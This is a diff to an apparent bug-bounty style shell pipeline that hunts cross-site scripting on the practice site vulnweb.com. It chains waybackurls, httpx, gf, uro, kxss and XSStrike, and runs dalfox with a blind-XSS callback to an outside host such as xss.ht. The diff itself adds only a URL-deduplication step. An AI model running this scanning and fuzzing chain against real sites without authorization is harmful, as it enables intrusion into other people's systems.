@@ -2,6 +2,7 @@
 echo vulnweb.com | waybackurls | tee domain.txt &&
 httpx -l domain.txt -mc 200,302 -o domain200.txt &&
 cat domain200.txt | gf xss | sed "s/=.*/=/" | sed "s/URL: //" | tee domain4xss.txt &&
+cat urls.txt | uro &&
 dalfox file domain4xss.txt -b (xss.ht or collaborator) pipe &&
 cat indeed.txt | kxss > xss.txt &&
 python XSStrike/xsstrike.py --seeds domain4xss.txt --fuzzer --file-log-level INFO --log-file output.log
